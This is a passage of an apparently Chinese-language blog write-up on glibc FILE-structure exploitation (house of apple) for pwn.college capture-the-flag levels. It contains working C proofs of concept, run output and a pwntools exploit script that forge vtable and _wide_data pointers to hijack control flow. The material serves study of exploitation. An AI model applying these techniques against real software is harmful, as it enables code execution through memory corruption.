class="built_in">printf</span>(<span class="string">&quot;IO_wfile_jumps = %p\n&quot;</span>, IO_wfile_jumps);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.构造fake_wide_vtable</span></span><br><span class="line">    fake_wide_vtable = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;++i)&#123;</span><br><span class="line">        fake_wide_vtable[i] = win;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.构造fake_wide_data</span></span><br><span class="line">    fake_wide_data = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    fake_wide_data[<span class="number">28</span>] = fake_wide_vtable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//4.fopen打开的FILE对象,会自动挂到IO_list_all上,省去了我们泄露IO_list_all并修改其值的步骤</span></span><br><span class="line">    fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fp-&gt;_flags |= ~(<span class="number">0x800</span> | <span class="number">0x8</span> |<span class="number">0x2</span>);</span><br><span class="line">    fp-&gt;_mode = <span class="number">0</span>;</span><br><span class="line">    fp-&gt;_IO_write_ptr = <span class="number">1</span>;</span><br><span class="line">    fp-&gt;_IO_write_base = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//修改vtable和wide_data.wide_vtable</span></span><br><span class="line">    vtable_ptr = (<span class="type">char</span>*)fp + <span class="number">0xd8</span>;</span><br><span class="line">    *vtable_ptr = IO_wfile_jumps;</span><br><span class="line">    wide_data_ptr = (<span class="type">char</span>*)fp + <span class="number">0xa0</span>;</span><br><span class="line">    *wide_data_ptr = fake_wide_data;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//fclose(fp);   如果fclose执行则fp会从IO_list_all中删除,因此不能执行</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//5.return and trigger win</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">└─# gcc fsop.c -o fsop -w</span><br><span class="line"></span><br><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">└─# ./fsop</span><br><span class="line"><span class="keyword">function</span> <span class="built_in">printf</span> addr = 0x7f218fb94110</span><br><span class="line">libc_addr = 0x7f218fb40000</span><br><span class="line">IO_wfile_jumps = 0x7f218fd15268</span><br><span class="line"><span class="keyword">function</span> win called</span><br></pre></td></tr></table></figure>



<p>也可以通过修改<code>stdout-&gt;_chain</code>指向假<code>FILE</code>实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _NR_sysexit 0x3C</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;function win called&quot;</span>);</span><br><span class="line">    <span class="comment">// printf(&quot;function win called\n&quot; );</span></span><br><span class="line">    syscall(_NR_sysexit);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span>* libc_base_addr;</span><br><span class="line">    <span class="type">size_t</span>* _IO_wfile_jumps;</span><br><span class="line">    <span class="type">size_t</span>* fake_wide_vtable;</span><br><span class="line">    <span class="type">size_t</span>* fake_wide_data;</span><br><span class="line"></span><br><span class="line">    FILE * fp;</span><br><span class="line">    <span class="type">size_t</span>* vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span>* vtable_addr;</span><br><span class="line">    <span class="type">size_t</span>* wide_data_ptr;</span><br><span class="line">    <span class="type">size_t</span>* wide_data_addr;</span><br><span class="line">    <span class="type">size_t</span>* wide_vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span>* wide_vtable_addr;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//0.泄露libc基地址,计算得到_IO_wfile_jumps表的地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function printf @ %p\n&quot;</span>, <span class="built_in">printf</span>);</span><br><span class="line">    libc_base_addr = (<span class="type">char</span>*) <span class="built_in">printf</span> - <span class="number">0x54110</span>;     <span class="comment">// printf offset @ glibc-2.38</span></span><br><span class="line">    _IO_wfile_jumps = (<span class="type">char</span>*)libc_base_addr + <span class="number">0x1d5268</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;_IO_wfile_jumps @ %p\n&quot;</span>,_IO_wfile_jumps);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.构造fake_wide_vtable,使用win填充</span></span><br><span class="line">    fake_wide_vtable = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;++i)&#123;</span><br><span class="line">        fake_wide_vtable[i]=_IO_wfile_jumps[i];</span><br><span class="line">    &#125;</span><br><span class="line">    fake_wide_vtable[<span class="number">13</span>] = (<span class="type">size_t</span>)win;</span><br><span class="line">    <span class="comment">//2.构造fake_wide_data,使得其偏移0xe0处的_wide_vtable指针,指向1中构造的fake_wide_vtable</span></span><br><span class="line">    fake_wide_data = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    fake_wide_data[<span class="number">28</span>] = fake_wide_vtable;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.修改FILE.flag |= ~(_IO_CURRENTLY_PUTTING | _IO_NO_WRITES | _IO_UNBUFFERED) </span></span><br><span class="line">    fp = fopen(<span class="string">&quot;./flag&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fp-&gt;_flags |= ~(<span class="number">0x800</span> | <span class="number">0x8</span> | <span class="number">2</span>);</span><br><span class="line">    <span class="comment">// fp-&gt;_IO_read_ptr =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_read_end =0;</span></span><br><span class="line">    fp-&gt;_IO_write_ptr =<span class="number">1</span>;</span><br><span class="line">    fp-&gt;_IO_write_end =<span class="number">0</span>;</span><br><span class="line">    fp-&gt;_mode=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">// fp-&gt;_IO_buf_base =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_buf_end =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_save_base =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_backup_base =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_save_end =0;</span></span><br><span class="line">    <span class="comment">//4.修改FILE.vtable指向3中泄露的_IO_wfile_jumps</span></span><br><span class="line">    vtable_ptr = (<span class="type">char</span>*)fp + <span class="number">0xd8</span>;</span><br><span class="line">    *vtable_ptr = _IO_wfile_jumps;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//5.修改FILE._wide_data指向2中构造的fake_wide_data</span></span><br><span class="line">    wide_data_ptr = (<span class="type">char</span>*)fp + <span class="number">0xa0</span>;</span><br><span class="line">    *wide_data_ptr = fake_wide_data;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//6.通过沾stdout亲带故上链</span></span><br><span class="line">    <span class="built_in">stdout</span>-&gt;_chain = fp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//6.trigger house of apple</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>











<h2 id="pwn-college"><a href="#pwn-college" class="headerlink" title="pwn.college"></a><a target="_blank" rel="noopener" href="https://pwn.college/software-exploitation/file-struct-exploits/">pwn.college</a></h2><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>篡改位于堆上的<code>FILE</code>结构,使其文件描述符<code>fileno</code>为1,也就是到标准输出</p>
<p>使其缓冲区位于泄露地址上</p>
<p>举一个例子</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> flag[]=<span class="string">&quot;flag&#123;secret&#125;&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag @ %p\n&quot;</span>,flag);			<span class="comment">//泄露flag地址</span></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x100</span>];</span><br><span class="line">    FILE *fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,fp,<span class="number">480</span>);</span><br><span class="line">    fwrite(buffer,<span class="number">1</span>,<span class="number">0x100</span>,fp);    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



















<h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><p><code>level7</code>题目中给的提示是这样的:</p>
<blockquote>
<p> This can be done by creating a fake _wide_data struct which will not have a security check on the vtable. </p>
</blockquote>
<p>意思是篡改<code>_wide_data.vtable</code>指针不会被检查</p>
<p>在一个<code>FILE</code>结构体中,理论上有两个<code>vtable</code>指针,一个<code>_IO_FILE_plus + 0xd8</code>处的<code>vtable</code>指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ptype/xo <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">/* <span class="title">offset</span>      |    <span class="title">size</span> */  <span class="title">type</span> =</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> &#123;</span></span><br><span class="line"><span class="comment">/* 0x0000      |  0x00d8 */</span>    FILE file;</span><br><span class="line"><span class="comment">/* 0x00d8      |  0x0008 */</span>    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):  224 */</span></span><br><span class="line">                             &#125;</span><br></pre></td></tr></table></figure>

<p>还有一个在<code>_IO_FILE._wide_data._wide_vtable</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_IO_FILE + 0xa0    =&gt;  _wide_data</span><br><span class="line">_wide_data + 0xe0  =&gt;  _wide_vtable</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ptype/xo <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">/* <span class="title">offset</span>      |    <span class="title">size</span> */  <span class="title">type</span> =</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> &#123;</span></span><br><span class="line"><span class="comment">/* 0x0000      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_read_ptr;</span><br><span class="line"><span class="comment">/* 0x0008      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_read_end;</span><br><span class="line"><span class="comment">/* 0x0010      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_read_base;</span><br><span class="line"><span class="comment">/* 0x0018      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_write_base;</span><br><span class="line"><span class="comment">/* 0x0020      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_write_ptr;</span><br><span class="line"><span class="comment">/* 0x0028      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_write_end;</span><br><span class="line"><span class="comment">/* 0x0030      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_buf_base;</span><br><span class="line"><span class="comment">/* 0x0038      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_buf_end;</span><br><span class="line"><span class="comment">/* 0x0040      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_save_base;</span><br><span class="line"><span class="comment">/* 0x0048      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_backup_base;</span><br><span class="line"><span class="comment">/* 0x0050      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_save_end;</span><br><span class="line"><span class="comment">/* 0x0058      |  0x0008 */</span>    <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line"><span class="comment">/* 0x0060      |  0x0008 */</span>    <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line"><span class="comment">/* 0x0068      |  0x0070 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> &#123;</span></span><br><span class="line"><span class="comment">/* 0x0068      |  0x0038 */</span>        _IO_iconv_t __cd_in;</span><br><span class="line"><span class="comment">/* 0x00a0      |  0x0038 */</span>        _IO_iconv_t __cd_out;</span><br><span class="line"></span><br><span class="line">                                   <span class="comment">/* total size (bytes):  112 */</span></span><br><span class="line">                               &#125; _codecvt;</span><br><span class="line"><span class="comment">/* 0x00d8      |  0x0004 */</span>    <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"><span class="comment">/* XXX  4-byte hole      */</span></span><br><span class="line"><span class="comment">/* 0x00e0      |  0x0008 */</span>    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):  232 */</span></span><br><span class="line">                             &#125;</span><br></pre></td></tr></table></figure>



<p>既然<code>_IO_FILE</code>本身就自带一个<code>vtable</code>,那么<code>level7</code>为何还要多此一举去改<code>_IO_FILE._wide_data._wide_vtable</code>?</p>
<p>因为<code>pwncollege</code>提供的靶场环境中使用的<code>libc</code>版本是<code>Ubuntu GLIBC 2.31-0ubuntu9.16</code></p>
<p>在<code>Glibc 2.23</code>之前是可以直接修改<code>_IO_FILE.vtable</code>指针的, 相关攻击方式被称为<code>house of orange</code>,</p>
<p>此攻击可以在<code>how2heap</code>靶场学习,<code>ubuntu16.04</code>有<code>Glibc2.23</code>环境</p>
<p>但<code>Glibc 2.24</code>之后就加入了对<code>_IO_FILE.vtable</code>指针的范围检查,只能在<code>glibc</code>内存区中的某个特定位置,不允许指向堆区或者栈区</p>
<p>但是<code>_IO_FILE._wide_data._wide_vtable</code>还是没有检查的,相关攻击方式被称为<code>house of apple</code></p>
<p>吃完<code>apple</code>回来,可以做level7题了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *          </span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">p = process(<span class="string">&quot;./babyfile_level7&quot;</span>)</span><br><span class="line"><span class="comment"># p=process(&quot;/challenge/babyfile_level7&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#0</span></span><br><span class="line"><span class="comment">#获取win函数地址,泄露puts地址,泄露libc基地址,泄露_IO_wfile_jumps地址</span></span><br><span class="line">win_addr = <span class="number">0x4012E6</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;[LEAK] The address of puts() within libc is: &#x27;</span>)</span><br><span class="line">puts_addr = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(puts_addr,<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;[LEAK] The name buffer is located at: &#x27;</span>)</span><br><span class="line">name_addr = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">name_addr = <span class="built_in">int</span>(name_addr,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_addr = &quot;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;name_addr = &quot;</span>,<span class="built_in">hex</span>(name_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">libc_addr = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">vtable_addr = libc_addr + libc.dump(<span class="string">&quot;_IO_file_jumps&quot;</span>)</span><br><span class="line">wide_vtable_addr =libc_addr + libc.dump(<span class="string">&quot;_IO_wfile_jumps&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc @ %p&quot;</span>,<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;vtable = &quot;</span>,<span class="built_in">hex</span>(vtable_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;wide_vtable = &quot;</span>,<span class="built_in">hex</span>(wide_vtable_addr))    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#1&amp;2 </span></span><br><span class="line"><span class="comment">#构造fake_wide_data和fake_wide_vtable,</span></span><br><span class="line"><span class="comment">#由于只有一个可用堆块,哥俩得穿一条裤子</span></span><br><span class="line">fake_wide_data_addr = name_addr</span><br><span class="line">fake_wide_vtable_addr = name_addr + <span class="number">0x80</span></span><br><span class="line">fake_wide_data  =p64(<span class="number">0</span>) * <span class="number">28</span></span><br><span class="line">fake_wide_data += p64(fake_wide_vtable_addr)<span class="comment">#     const struct _IO_jump_t *_wide_vtable;</span></span><br><span class="line">fake_wide_data += p64(win_addr)</span><br><span class="line">p.send(fake_wide_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#3</span></span><br><span class="line"><span class="comment">#设置FILE.flag</span></span><br><span class="line">fp = FileStructure()</span><br><span class="line">fp.flags = ~(<span class="number">0x800</span> | <span class="number">0x8</span> | <span class="number">2</span>)</span><br><span class="line"><span class="comment">#不能有_IO_CURRENTLY_PUTTING</span></span><br><span class="line"><span class="comment">#可写,不能有_IO_NO_WRITES</span></span><br><span class="line"><span class="comment">#不能有_IO_UNBUFFERED</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#4&amp;5</span></span><br><span class="line"><span class="comment">#修改FILE.vtable指向_IO_wfile_jumps,</span></span><br><span class="line"><span class="comment">#修改FILE._wide_data指向fake_wide_data</span></span><br><span class="line"><span class="comment">#这里设置的flags是保证能进入某些分支</span></span><br><span class="line">fp.vtable = wide_vtable_addr</span><br><span class="line">fp._wide_data = name_addr</span><br><span class="line">payload = <span class="built_in">bytes</span>(fp)</span><br><span class="line"><span class="built_in">print</span>(fp)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><p><code>level9</code>中有一个函数<code>authenticated</code>可以<code>ret2text</code></p>
<p><code>level9</code>首先泄露的<code>puts</code>的地址</p>
<p><code>level9</code>给的利用点就是可以往<code>_IO_2_1_stdout_</code>结构体写入最多<code>0x1e0</code>个字节</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(0,stdout,0x1e0)</span><br></pre></td></tr></table></figure>

<p>最初的想法是直接修改</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stdout -&gt; vtable = _IO_wfile_jumps</span><br><span class="line">stdout -&gt; _wide_data -&gt; _wide_vtable -&gt; _IO_wfile_doallocate = authenticated </span><br></pre></td></tr></table></figure>

<p>这样在下次<code>puts</code>或者<code>printf</code>时就可以触发<code>authenticated</code>函数</p>
<p>然而很不幸</p>
<p><code>authenticated</code>中在使用<code>write(1,flag_buffer,flag_length)</code>打印flag之前,还有一个<code>puts(&quot;You win! Here is your flag:&quot;);</code>这会导致什么呢?</p>
<p>puts调用authenticated</p>
<p>authenticated调用puts</p>
<p>puts调用authenticated</p>
<p>authenticated调用puts</p>
<p>…</p>
<p>发生了递归调用的悲剧, 最终程序会因为爆栈内存导致段错误</p>
<p>原因是<code>puts</code>默认使用的就是<code>stdout</code>,而我们改的也正是<code>stdout</code></p>
<blockquote>
<p>可以通过这个poc调试观察这个悲剧</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _NR_sysexit 0x3C</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;function win called&quot;</span>);</span><br><span class="line">    <span class="comment">// printf(&quot;function win called\n&quot; );</span></span><br><span class="line">    syscall(_NR_sysexit);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span>* libc_base_addr;</span><br><span class="line">    <span class="type">size_t</span>* _IO_wfile_jumps;</span><br><span class="line">    <span class="type">size_t</span>* fake_wide_vtable;</span><br><span class="line">    <span class="type">size_t</span>* fake_wide_data;</span><br><span class="line"></span><br><span class="line">    FILE * fp;</span><br><span class="line">    <span class="type">size_t</span>* vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span>* vtable_addr;</span><br><span class="line">    <span class="type">size_t</span>* wide_data_ptr;</span><br><span class="line">    <span class="type">size_t</span>* wide_data_addr;</span><br><span class="line">    <span class="type">size_t</span>* wide_vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span>* wide_vtable_addr;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//0.泄露libc基地址,计算得到_IO_wfile_jumps表的地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function printf @ %p\n&quot;</span>, <span class="built_in">printf</span>);</span><br><span class="line">    libc_base_addr = (<span class="type">char</span>*) <span class="built_in">printf</span> - <span class="number">0x54110</span>;     <span class="comment">// printf offset @ glibc-2.38</span></span><br><span class="line">    _IO_wfile_jumps = (<span class="type">char</span>*)libc_base_addr + <span class="number">0x1d5268</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;_IO_wfile_jumps @ %p\n&quot;</span>,_IO_wfile_jumps);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.构造fake_wide_vtable,使用win填充</span></span><br><span class="line">    fake_wide_vtable = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;++i)&#123;</span><br><span class="line">        fake_wide_vtable[i]=_IO_wfile_jumps[i];</span><br><span class="line">    &#125;</span><br><span class="line">    fake_wide_vtable[<span class="number">13</span>] = (<span class="type">size_t</span>)win;</span><br><span 